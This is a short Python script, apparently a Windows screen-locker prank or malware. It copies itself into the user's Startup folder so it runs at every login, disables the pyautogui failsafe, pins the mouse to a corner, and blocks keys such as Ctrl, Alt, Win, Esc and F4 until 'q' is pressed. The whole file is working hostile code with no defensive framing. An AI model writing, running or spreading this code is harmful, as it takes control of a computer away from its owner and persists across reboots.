import sys
import pyautogui as p
import getpass
import keyboard
import os
import shutil

username = getpass.getuser()
if getattr(sys, 'frozen', False):
    script_path = sys.executable
else:
    # В случае запуска из скрипта
    script_path = os.path.abspath(__file__)
script_name = os.path.basename(script_path)
check_path = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{script_name}'
if not os.path.exists(check_path):
    shutil.copyfile(script_path, check_path)

p.FAILSAFE = False
while not keyboard.is_pressed('q'):
    p.moveTo(0, 0)
    keyboard.block_key('ctrl')
    keyboard.block_key('shift')
    keyboard.block_key('esc')
    keyboard.block_key('alt')
    keyboard.block_key('f4')
    keyboard.block_key('win')
    keyboard.block_key('d')
